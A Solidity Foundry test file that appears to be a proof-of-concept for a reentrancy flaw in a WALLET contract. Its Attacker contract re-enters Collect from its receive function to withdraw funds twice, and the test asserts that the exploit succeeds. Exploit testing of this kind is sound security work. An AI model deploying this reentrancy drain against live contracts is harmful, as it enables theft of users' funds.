
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {WALLET, Log} from "../src/WALLET.sol";

contract TestReentrancyWALLET is Test {

    WALLET public wallet;
    Attacker public _attacker;

    function setUp() public {
        Log log = new Log();
        wallet = new WALLET(address(log));
        
        _attacker = new Attacker(address(wallet));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        vm.assume(attackVal >= 1 ether && attackVal <= type(uint128).max);
        

        

        
        vm.deal(address(wallet), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);

        
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        vm.warp(block.timestamp + 1);
        _attacker.attack(attackVal);

        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    WALLET public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        attackAmount = val;
        victim.Put{value: msg.value}(block.timestamp);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        victim.Collect(val);

        if (address(this).balance >= initialSnapshot + val * 2 && attackCallCount == 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(attackAmount);
        }
    }
}
